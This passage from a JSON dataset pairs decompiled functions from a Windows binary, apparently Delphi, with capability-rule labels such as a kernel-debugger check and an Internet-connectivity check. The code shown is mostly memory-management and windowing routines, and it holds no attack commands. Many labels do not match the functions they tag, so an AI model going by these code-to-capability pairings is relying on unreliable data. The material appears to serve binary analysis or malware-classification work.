uVar1 + 2) = 0;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 != 0x20);\n    }\n    return;\n}\n",
        "token_count": 425
    },
    "004642a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004642a0(uint param_1, int64_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint16_t in_FPUStatusWord;\n    float10 extraout_ST0;\n    float10 fVar4;\n    uint var_44h;\n    uint16_t auStack68 [32];\n    \n    uVar3 = *in_EAX;\n    if (uVar3 == 0) {\n        return in_EAX & 0xffffff00;\n    }\n    uVar2 = uVar3 + 1 >> 1;\n    do {\n        auStack68[uVar2 - 1] = (in_EAX[uVar2 + 1] & 0xf) << 8 | in_EAX[uVar2 + 1] >> 4;\n        uVar2 = uVar2 - 1;\n    } while (uVar2 != 0);\n    do {\n        uVar1 = 0;\n        if (*(auStack68 + uVar2) != '\\0') goto code_r0x004642ea;\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != uVar3);\n    fVar4 = 0;\ncode_r0x00464317:\n    *param_2 = ROUND(fVar4);\n    return uVar1 & 0xffff0000 | in_FPUStatusWord & 0xffffff00 | ~in_FPUStatusWord & 0xffffff01;\ncode_r0x004642ea:\n    do {\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != uVar3);\n    uVar1 = fcn.00403368();\n    fVar4 = extraout_ST0;\n    goto code_r0x00464317;\n}\n",
        "token_count": 413
    },
    "004751f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004751f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(in_EAX + 0xa9) == '\\0') {\n        iVar1 = (**(**(in_EAX + 0x3c) + 0x14))();\n        if (-1 < iVar1 + -1) {\n            do {\n                iVar2 = fcn.0046cc50();\n                if (((*(iVar2 + 0x21) != '\\0') && (3 < *(iVar2 + 0x21) - 0x1aU)) &&\n                   (((*(iVar2 + 0x22) & 1) == 0 || (*(*(in_EAX + 0x38) + 0x3c) != '\\0')))) {\n                    (**(**(in_EAX + 0x3c) + 0xc))();\n                    uVar3 = 1;\n                    fcn.0046c61c(1, 0);\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        iVar1 = fcn.0041d234();\n        if (-1 < iVar1 + -1) {\n            do {\n                iVar2 = fcn.0046c8dc();\n                if ((*(iVar2 + 0x21) != '\\0') && (((*(iVar2 + 0x22) & 1) == 0 || (*(*(in_EAX + 0x38) + 0x3c) != '\\0'))))\n                {\n                    uVar3 = 1;\n                    fcn.0046c61c(1, 0);\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    fcn.0047511c(&stack0xfffffffc);\n    *in_FS_OFFSET = uVar3;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 497
    },
    "00476890": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476890(uint param_1, uint8_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x476a41;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*(in_EAX + 0x22) != '\\0') {\ncode_r0x00476a2b:\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x476a48;\n        uStack28 = 0x476a40;\n        fcn.004045c8();\n        return;\n    }\n    if ((param_2 & 1) == 0) {\n        uStack36 = 0;\n        puStack40 = 0x47692f;\n        cVar1 = (**(*in_EAX + 0x1f0))();\n        if (cVar1 != '\\0') {\n            puStack40 = NULL;\n            uStack44 = 0x476951;\n            cVar1 = (**(*in_EAX + 0x1f0))();\n            if (cVar1 != '\\0') {\n                puStack40 = NULL;\n                uStack44 = 0x476973;\n                cVar1 = (**(*in_EAX + 0x1f0))();\n                if (cVar1 != '\\0') {\n                    puStack40 = 0x476982;\n                    (**(*in_EAX + 0x90))();\n                    puStack40 = 0x476991;\n                    (**(*in_EAX + 0xac))();\n                    goto code_r0x00476a2b;\n                }\n            }\n        }\n    }\n    else {\n        uStack36 = 0x4768ce;\n        puStack24 = &stack0xfffffffc;\n        fcn.00476b24();\n        uStack36 = 1;\n        puStack40 = 0x4768ec;\n        cVar1 = (**(*in_EAX + 0x1f0))();\n        if (cVar1 != '\\0') {\n            puStack40 = 0x476901;\n            fcn.0040675c();\n            puStack40 = 0x47690c;\n            fcn.0046bba0();\n        }\n    }\n    if ((param_2 & 2) == 0) {\n        iVar2 = in_EAX[0x15];\n    }\n    else {\n        iVar2 = in_EAX[0x13] - 1U >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((in_EAX[0x13] - 1U & 1) != 0);\n        }\n    }\n    puStack40 = 0x4769c2;\n    fcn.00476a50();\n    puStack40 = 0x4769cd;\n    (**(*in_EAX + 0x118))();\n    uStack44 = 0x476a24;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    for (; 0 < iVar2; iVar2 = iVar2 + -1) {\n        cVar1 = (**(*in_EAX + 0x148))();\n        if (cVar1 == '\\0') break;\n    }\n    (**(*in_EAX + 0x13c))();\n    (**(*in_EAX + 0x144))();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x476a2b;\n    uStack44 = 0x476a23;\n    (**(*in_EAX + 0xac))();\n    return;\n}\n",
        "token_count": 904
    },
    "00479de8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00479de8(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x479f19;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0xc) == 0) {\n        fcn.00426348();\n        fcn.00404e20();\n        fcn.00404e30();\n        fcn.004263bc();\n        fcn.004263f8();\n        fcn.00426460();\n        fcn.004263f8();\n        fcn.004263f8();\n        fcn.004263f8();\n        fcn.00406298();\n        fcn.0047a878();\n        fcn.00465b2c();\n        fcn.00479900();\n        puVar1 = puStack64;\n    }\n    puStack64 = puVar1;\n    fcn.004062dc();\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x479f20;\n    uStack68 = 0x479f08;\n    fcn.004045c8();\n    uStack68 = 0x479f10;\n    fcn.00406298();\n    uStack68 = 0x479f18;\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 417
    },
    "00479c48": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00479c48(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    var_8h = NULL;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    uStack32 = 0x479dc6;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if ((*(in_EAX + 0x18) == '\\0') && (*(in_EAX + 0xc) != 0)) {\n        *(in_EAX + 0x18) = 1;\n        uStack44 = 0x479d99;\n        piStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_4h = in_EAX;\n        fcn.004062dc();\n        fcn.00426348();\n        fcn.00404e20();\n        (**(*var_8h + 0x10))(var_8h, var_ch);\n        var_14h = fcn.004263bc();\n        (**(*var_8h + 0x18))(var_8h, ROUND(var_14h * *0x479de4));\n        uVar2 = fcn.004263f8();\n        (**(*var_8h + 0x20))(var_8h, -((uVar2 & 1) != 0));\n        uVar2 = fcn.004263f8();\n        (**(*var_8h + 0x28))(var_8h, -((uVar2 & 2) != 0));\n        uVar2 = fcn.004263f8();\n        (**(*var_8h + 0x30))(var_8h, -((uVar2 & 4) != 0));\n        uVar2 = fcn.004263f8();\n        (**(*var_8h + 0x38))(var_8h, -((uVar2 & 8) != 0));\n        uVar1 = fcn.00426460();\n        (**(*var_8h + 0x48))(var_8h, uVar1);\n        *in_FS_OFFSET = var_8h;\n        *(var_4h + 0x18) = 0;\n        return;\n    }\n    *in_FS_OFFSET = piStack36;\n    puStack28 = 0x479dcd;\n    uStack32 = 0x479db5;\n    fcn.004045c8();\n    uStack32 = 0x479dbd;\n    fcn.00404cd4();\n    uStack32 = 0x479dc5;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 729
    },
    "0047b478": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0047b478(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    char extraout_DL;\n    int32_t **in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0043fd64();\n    *(in_EAX + 9) = *(in_EAX + 9) | 2;\n    (**(*in_EAX + 0xd0))();\n    *(in_EAX[0x82] + 0x48) = *(in_EAX[0x82] + 0x48) + 1;\n    if (0 < *(in_EAX[0x82] + 0x34)) {\n        iVar1 = fcn.004037f0();\n        in_EAX[0x90] = iVar1;\n        fcn.0041c6e4();\n        iVar1 = *(in_EAX[0x90] + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.00425f64();\n                fcn.0041c62c();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    if (0 < *(in_EAX[0x82] + 0x3c)) {\n        iVar1 = fcn.004037f0();\n        in_EAX[0x91] = iVar1;\n        fcn.0041c6e4();\n        iVar1 = *(in_EAX[0x91] + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.00428e2c();\n                fcn.0041c62c();\n                iVar2 = fcn.0041c4c8();\n                *(iVar2 + 0x14) = in_EAX;\n                *(iVar2 + 0x10) = 0x47c5fc;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    iVar1 = fcn.0047b34c();\n    in_EAX[0x84] = iVar1;\n    fcn.0047baec();\n    (**(*in_EAX + 0xd4))();\n    (**(*in_EAX[0x86] + 0x58))(in_EAX[0x86], 1, in_EAX + 0x8f);\n    fcn.00465b2c();\n    if (((*(in_EAX[0x82] + 0x44) & 2) == 0) && (((*(in_EAX + 0x23e) & 2) != 0 || ((*(in_EAX[0x82] + 0x44) & 1) != 0))))\n    {\n        piVar3 = in_EAX;\n        if (in_EAX != NULL) {\n            piVar3 = in_EAX + 0x99;\n        }\n        (**(*in_EAX[0x86] + 0xc))(in_EAX[0x86], piVar3);\n        fcn.00465b2c();\n    }\n    uVar4 = fcn.00406298();\n    (***in_EAX[0x86])(in_EAX[0x86], 0x47b694, uVar4);\n    fcn.00465b2c();\n    if ((*(in_EAX + 0x23d) & 4) != 0) {\n        fcn.0043d768();\n    }\n    if ((*(in_EAX + 0x23e) & 1) == 0) {\n        in_EAX[0x14] = *0x47b6a8;\n    }\n    else {\n        in_EAX[0x14] = *0x47b6a4;\n    }\n    fcn.004442b0();\n    piVar3 = in_EAX;\n    fcn.0047d580(in_EAX);\n    fcn.00465b2c();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = piVar3;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1008
    },
    "0047b7a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0047b7a4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar3;\n    int32_t *piStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t *piStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x47ba44;\n    piStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (in_EAX[0x88] == 0) {\n        *in_FS_OFFSET = &stack0xffffffcc;\n        uStack60 = 0x47b811;\n        piStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.00406298();\n        piVar3 = in_EAX[0x86];\n        (**(*piVar3 + 0x10))(piVar3, uVar2);\n        *in_FS_OFFSET = piVar3;\n        piStack64 = in_EAX;\n        if (in_EAX != NULL) {\n            piStack64 = in_EAX + 0x99;\n        }\n        (**(*in_EAX[0x86] + 0xc))(in_EAX[0x86]);\n        piStack64 = 0x47b849;\n        fcn.00465b2c();\n        iVar1 = in_EAX[0x85];\n        if (iVar1 == 0) {\n            piStack64 = in_EAX[0x87];\n            (**(*piStack64 + 0x20))();\n            fcn.00465b2c();\n        }\n        else {\n            piStack64 = 0x47b874;\n            piStack64 = fcn.00406298();\n            sub.ole32.dll_CreateStreamOnHGlobal(iVar1, 0);\n            fcn.00465b2c();\n            (**(*in_EAX[0x87] + 0x14))(in_EAX[0x87], 0);\n            fcn.00465b2c();\n            fcn.0047bfac();\n        }\n        uVar2 = fcn.00406298();\n        (***in_EAX[0x86])(in_EAX[0x86], 0x47ba54, uVar2);\n        fcn.00465b2c();\n        uVar2 = fcn.00406298();\n        (***in_EAX[0x86])(in_EAX[0x86], 0x47ba64, uVar2);\n        fcn.00465b2c();\n        uVar2 = fcn.00406298();\n        (***in_EAX[0x86])(in_EAX[0x86], 0x47ba74, uVar2);\n        fcn.00465e18(in_EAX + 0x8d);\n        fcn.00465e18(in_EAX + 0x8e);\n        if ((*(in_EAX[0x82] + 0x2c) & 1) != 0) {\n            (**(*in_EAX + 0xdc))(in_EAX, 0xfffffe0b);\n        }\n        if ((*(in_EAX[0x82] + 0x2c) & 8) != 0) {\n            (**(*in_EAX + 0xdc))(in_EAX, 0xfffffdfe);\n        }\n        if ((*(in_EAX[0x82] + 0x2c) & 4) != 0) {\n            (**(*in_EAX + 0xdc))(in_EAX, 0xfffffe00);\n        }\n        if ((*(in_EAX[0x82] + 0x2c) & 2) != 0) {\n            (**(*in_EAX + 0xdc))(in_EAX, 0xfffffdff);\n        }\n        (**(*in_EAX[0x88] + 0x14))(in_EAX[0x88], 0xffffffff);\n        puStack56 = 0x47ba05;\n        fcn.0047d580(in_EAX);\n        *in_FS_OFFSET = in_EAX;\n    }\n    *in_FS_OFFSET = piStack40;\n    puStack32 = 0x47ba4b;\n    uStack36 = 0x47ba3b;\n    fcn.00406298();\n    uStack36 = 0x47ba43;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 1058
    },
    "0047bda8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047bda8(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x47be29;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    cVar1 = fcn.00444380();\n    if (cVar1 != '\\0') {\n        if ((0xbbff < *param_2) && (*param_2 < 0xc000)) {\n            *param_2 = *param_2 - 0x9c00;\n        }\n        if ((*(in_EAX + 0x23e) & 1) == 0) {\n            uVar2 = fcn.0044407c(*param_2, param_2[1], param_2[2]);\n            uVar4 = *(in_EAX + 0x174);\n            uVar3 = sub.user32.dll_CallWindowProcA(uVar4, uVar2);\n            param_2[3] = uVar3;\n            *in_FS_OFFSET = uVar4;\n            return;\n        }\n    }\n    fcn.00441bbc();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 337
    },
    "0047d16c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0047d16c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    puStack12 = 0x47d17b;\n    var_4h = in_EAX;\n    fcn.00443578();\n    if (((*(*(var_4h + 0x208) + 0x2c) & 1) != 0) && (*(var_4h + 0x249) == '\\0')) {\n        puStack12 = 0x47d19e;\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            *(var_4h + 0x249) = 1;\n            uStack16 = 0x47d1e5;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            puStack12 = &stack0xfffffffc;\n            fcn.0047c7d0();\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x249) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "0040145c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * fcn.0040145c(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    if (*0x4855e8 == NULL) {\n        puVar2 = sub.kernel32.dll_LocalAlloc(0, 0x644);\n        if (puVar2 == NULL) {\n            return NULL;\n        }\n        *puVar2 = *0x4855e4;\n        iVar3 = 0;\n        *0x4855e4 = puVar2;\n        do {\n            piVar1 = puVar2 + iVar3 * 4 + 1;\n            *piVar1 = *0x4855e8;\n            iVar3 = iVar3 + 1;\n            *0x4855e8 = piVar1;\n        } while (iVar3 != 100);\n    }\n    puVar2 = *0x4855e8;\n    *0x4855e8 = **0x4855e8;\n    return puVar2;\n}\n",
        "token_count": 226
    },
    "004014e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004014e8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    int32_t *piVar2;\n    uint uVar3;\n    \n    piVar2 = fcn.0040145c();\n    if (piVar2 == NULL) {\n        uVar3 = 0;\n    }\n    else {\n        piVar2[2] = *param_2;\n        piVar2[3] = param_2[1];\n        piVar1 = *in_EAX;\n        *piVar2 = piVar1;\n        piVar2[1] = in_EAX;\n        piVar1[1] = piVar2;\n        *in_EAX = piVar2;\n        uVar3 = CONCAT31(piVar2 >> 8, 1);\n    }\n    return CONCAT44(piVar2, uVar3);\n}\n",
        "token_count": 208
    },
    "00401600": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401600(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    int32_t *piStack32;\n    \n    piStack32 = in_EAX;\n    while( true ) {\n        uVar1 = *param_2;\n        uVar2 = piStack32[2];\n        if ((uVar2 <= uVar1) && (uVar1 + param_2[1] <= uVar2 + piStack32[3])) break;\n        piStack32 = *piStack32;\n        if (piStack32 == in_EAX) {\n            return 0;\n        }\n    }\n    if (uVar1 == uVar2) {\n        piStack32[2] = piStack32[2] + param_2[1];\n        piStack32[3] = piStack32[3] - param_2[1];\n        if (piStack32[3] == 0) {\n            fcn.00401544();\n        }\n    }\n    else if (uVar2 + piStack32[3] == uVar1 + param_2[1]) {\n        piStack32[3] = piStack32[3] - param_2[1];\n    }\n    else {\n        piStack32[3] = uVar1 - uVar2;\n        cVar3 = fcn.004014e8();\n        if (cVar3 == '\\0') {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 355
    },
    "00401728": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401728(int32_t *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    param_1[1] = 0x100000;\n    iVar2 = sub.kernel32.dll_VirtualAlloc();\n    *param_1 = iVar2;\n    if (iVar2 == 0) {\n        param_1[1] = param_2 + 0xffffU & 0xffff0000;\n        iVar2 = sub.kernel32.dll_VirtualAlloc();\n        *param_1 = iVar2;\n    }\n    if (*param_1 != 0) {\n        cVar1 = fcn.004014e8();\n        if (cVar1 == '\\0') {\n            sub.kernel32.dll_VirtualFree(*param_1, 0, 0x8000);\n            *param_1 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "004017a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004017a0(uint32_t *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint *puStack40;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    uStack32 = 0xffffffff;\n    uStack28 = 0;\n    puStack40 = *0x4855ec;\n    puVar1 = puStack40;\n    while (puStack40 = puVar1,  puStack40 != 0x4855ec) {\n        puVar1 = *puStack40;\n        uVar2 = puStack40[2];\n        if ((in_EAX <= uVar2) && (uVar2 + puStack40[3] <= param_2 + in_EAX)) {\n            if (uVar2 < uStack32) {\n                uStack32 = uVar2;\n            }\n            if (uStack28 < puStack40[2] + puStack40[3]) {\n                uStack28 = puStack40[2] + puStack40[3];\n            }\n            iVar3 = sub.kernel32.dll_VirtualFree(puStack40[2], 0, 0x8000);\n            if (iVar3 == 0) {\n                *0x4855c8 = 1;\n            }\n            fcn.00401544();\n        }\n    }\n    *param_1 = 0;\n    if (uStack28 != 0) {\n        *param_1 = uStack32;\n        param_1[1] = uStack28 - uStack32;\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "004019e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004019e4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint *puStack28;\n    int32_t iStack24;\n    \n    do {\n        for (puStack28 = *0x4855fc; puStack28 != 0x4855fc; puStack28 = *puStack28) {\n            if ((in_EAX + 0x3fffU & 0xffffc000) <= puStack28[3]) {\n                fcn.00401868();\n                if (*param_2 == 0) {\n                    return;\n                }\n                puStack28[2] = puStack28[2] + param_2[1];\n                puStack28[3] = puStack28[3] - param_2[1];\n                if (puStack28[3] != 0) {\n                    return;\n                }\n                fcn.00401544();\n                return;\n            }\n        }\n        fcn.004016c4();\n        if (*param_2 == 0) {\n            return;\n        }\n        fcn.00401578();\n    } while (iStack24 != 0);\n    fcn.004017a0();\n    *param_2 = 0;\n    return;\n}\n",
        "token_count": 281
    },
    "00401a8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401a8c(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint *puStack36;\n    int32_t iStack32;\n    int32_t iStack24;\n    \n    uVar1 = param_2 + 0x3fffU & 0xffffc000;\ncode_r0x00401aaf:\n    do {\n        for (puStack36 = *0x4855fc; (puStack36 != 0x4855fc && (in_EAX != puStack36[2])); puStack36 = *puStack36) {\n        }\n        if (in_EAX == puStack36[2]) {\n            if (uVar1 <= puStack36[3]) goto code_r0x00401b75;\n            fcn.00401728();\n            if (iStack32 != 0) {\n                fcn.00401578();\n                if (iStack24 == 0) {\n                    fcn.004017a0();\n                    *param_1 = 0;\n                    return;\n                }\n                goto code_r0x00401aaf;\n            }\n        }\n        fcn.00401728();\n        if (iStack32 == 0) {\ncode_r0x00401b75:\n            if ((in_EAX != puStack36[2]) || (puStack36[3] < uVar1)) {\n                *param_1 = 0;\n                return;\n            }\n            fcn.00401868();\n            if (*param_1 == 0) {\n                return;\n            }\n            puStack36[2] = puStack36[2] + param_1[1];\n            puStack36[3] = puStack36[3] - param_1[1];\n            if (puStack36[3] != 0) {\n                return;\n            }\n            fcn.00401544();\n            return;\n        }\n        fcn.00401578();\n        if (iStack24 == 0) {\n            fcn.004017a0();\n            *param_1 = 0;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 480
    },
    "00401bd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401bd0(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    if ((in_EAX + 0x3fffU & 0xffffc000) < (param_2 + in_EAX & 0xffffc000U)) {\n        fcn.00401928();\n        fcn.00401578();\n        if (iStack20 != 0) {\n            fcn.004017a0();\n            iStack20 = iStack12;\n        }\n        if (iStack20 != 0) {\n            fcn.00401600();\n        }\n    }\n    else {\n        *param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00401c64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00401c64(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x401d2c;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    sub.kernel32.dll_InitializeCriticalSection(0x4855cc);\n    if (*0x48504d != '\\0') {\n        sub.kernel32.dll_EnterCriticalSection(0x4855cc);\n    }\n    fcn.004014e0();\n    fcn.004014e0();\n    fcn.004014e0();\n    uVar2 = 0;\n    *0x485624 = sub.kernel32.dll_LocalAlloc(0, 0xff8);\n    if (*0x485624 != 0) {\n        iVar1 = 3;\n        do {\n            *(*0x485624 + -0xc + iVar1 * 4) = 0;\n            iVar1 = iVar1 + 1;\n        } while (iVar1 != 0x401);\n        var_4h = 0x48560c;\n        *0x485610 = 0x48560c;\n        *0x48560c = 0x48560c;\n        *0x485618 = 0x48560c;\n        *0x4855c4 = 1;\n    }\n    *in_FS_OFFSET = uVar2;\n    if (*0x48504d != '\\0') {\n        sub.kernel32.dll_LeaveCriticalSection(0x4855cc, 0x401d33);\n    }\n    return;\n}\n",
        "token_count": 390
    },
    "00401d3c": {
        "rules": [
